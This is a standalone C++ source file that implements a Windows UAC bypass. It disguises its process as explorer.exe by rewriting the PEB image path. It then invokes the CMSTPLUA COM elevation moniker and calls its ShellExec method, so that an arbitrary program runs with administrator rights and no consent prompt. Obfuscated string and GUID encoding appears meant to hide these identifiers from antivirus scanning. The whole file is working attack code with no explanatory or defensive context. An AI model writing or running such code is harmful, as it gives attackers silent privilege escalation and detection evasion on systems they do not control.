#define WIN32_LEAN_AND_MEAN
#define VC_EXTRALEAN
#define NOMINMAX
#define NOGDI
#define NOSERVICE
#define NOSOUND
#define NOMCX
#define NOCOMM
#define NOKERNEL
#define NOGDICAPMASKS

#include <windows.h>
#include <winternl.h>
#include <objbase.h>

#pragma comment(linker, "/ALIGN:512")

template<size_t N>
struct EncryptedString {
    BYTE data[N];
    DWORD seed;

    constexpr EncryptedString(const wchar_t(&str)[N], DWORD s = 0xDEADBEEF) : seed(s) {
        for (size_t i = 0; i < N - 1; i++) {
            BYTE v = (BYTE)str[i];
            v ^= (BYTE)((s >> (i & 31)) & 0xFF);
            v = ~v;
            v ^= (BYTE)(i * 0x1D);
            v = (v << ((i % 5) + 1)) | (v >> (8 - ((i % 5) + 1)));
            v ^= (BYTE)((s >> ((i + 5) & 31)) & 0xFF);
            v = (v + 0x37) ^ 0x5A;
            data[i] = v;
        }
        data[N - 1] = 0;
    }

    void DecryptTo(wchar_t* out) const {
        for (size_t i = 0; i < N - 1; i++) {
            BYTE v = data[i];
            v = (v ^ 0x5A) - 0x37;
            v ^= (BYTE)((seed >> ((i + 5) & 31)) & 0xFF);
            v = (v >> ((i % 5) + 1)) | (v << (8 - ((i % 5) + 1)));
            v ^= (BYTE)(i * 0x1D);
            v = ~v;
            v ^= (BYTE)((seed >> (i & 31)) & 0xFF);
            out[i] = (wchar_t)v;
        }
        out[N - 1] = 0;
    }

    const wchar_t* Get() const {
        static wchar_t buf[N];
        DecryptTo(buf);
        return buf;
    }
};

struct SG {
    BYTE l[8], h[8], kl, kh;
    constexpr SG(BYTE b0, BYTE b1, BYTE b2, BYTE b3, BYTE b4, BYTE b5, BYTE b6, BYTE b7,
        BYTE b8, BYTE b9, BYTE ba, BYTE bb, BYTE bc, BYTE bd, BYTE be, BYTE bf,
        BYTE kl_, BYTE kh_) : kl(kl_), kh(kh_) {
        l[0] = b0 ^ (kl_ ^ 0); l[1] = b1 ^ (kl_ ^ 0x1D); l[2] = b2 ^ (kl_ ^ 0x3A); l[3] = b3 ^ (kl_ ^ 0x57);
        l[4] = b4 ^ (kl_ ^ 0x74); l[5] = b5 ^ (kl_ ^ 0x91); l[6] = b6 ^ (kl_ ^ 0xAE); l[7] = b7 ^ (kl_ ^ 0xCB);
        h[0] = b8 ^ (kh_ ^ 0); h[1] = b9 ^ (kh_ ^ 0x2B); h[2] = ba ^ (kh_ ^ 0x56); h[3] = bb ^ (kh_ ^ 0x81);
        h[4] = bc ^ (kh_ ^ 0xAC); h[5] = bd ^ (kh_ ^ 0xD7); h[6] = be ^ (kh_ ^ 0x102); h[7] = bf ^ (kh_ ^ 0x12D);
    }
};

static void DG(GUID& g, const SG& s) {
    BYTE b[16];
    for (int i = 0; i < 8; i++) b[i] = s.l[i] ^ (s.kl ^ (BYTE)(i * 0x1D));
    for (int i = 0; i < 8; i++) b[8 + i] = s.h[i] ^ (s.kh ^ (BYTE)(i * 0x2B));
    memcpy(&g, b, 16);
}

#define SECURE_STR(n, v) static constexpr auto n = EncryptedString<sizeof(v)/2>(v)
#define XGUID(v, a,b,c, b0,b1,b2,b3,b4,b5,b6,b7) \
    static constexpr SG _##v((BYTE)(a),(BYTE)(a>>8),(BYTE)(a>>16),(BYTE)(a>>24), (BYTE)(b),(BYTE)(b>>8),(BYTE)(c),(BYTE)(c>>8), b0,b1,b2,b3,b4,b5,b6,b7,0xA3,0x5E); GUID v; DG(v, _##v)

SECURE_STR(ES, L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}");
SECURE_STR(EX, L"C:\\Windows\\explorer.exe");

static PPEB Peb = (PPEB)(*(uintptr_t*)((BYTE*)__readgsqword(0x30) + 0x60));

static void MyWcsCpy(wchar_t* dest, size_t destSize, const wchar_t* src) {
    size_t i = 0;
    while (i < destSize - 1 && src[i] != L'\0') {
        dest[i] = src[i];
        i++;
    }
    dest[i] = L'\0';
}

int wmain(int argc, wchar_t* argv[]) 
{
    if (argc < 2) return 1;
    MyWcsCpy(Peb->ProcessParameters->ImagePathName.Buffer, Peb->ProcessParameters->ImagePathName.MaximumLength / sizeof(WCHAR), EX.Get());

    HRESULT hr = CoInitialize(0);
    IUnknown* p = 0;
    BIND_OPTS3 b = { sizeof(b) };
    b.dwClassContext = CLSCTX_LOCAL_SERVER;

    XGUID(iid, 0x6EDD6D74, 0xC007, 0x4E75, 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C);

    if (SUCCEEDED(CoGetObject(ES.Get(), (BIND_OPTS*)&b, iid, (void**)&p)) && p) {
        typedef HRESULT(__stdcall* F)(IUnknown*, LPCWSTR, LPCWSTR, LPCWSTR, ULONG, ULONG);
        F f = (F)(*(void***)p)[9];
        if (SUCCEEDED(f(p, argv[1], 0, 0, 0, 5))) hr = S_OK;
        p->Release();
    }

    if (hr == S_OK) CoUninitialize();
    return 0;
}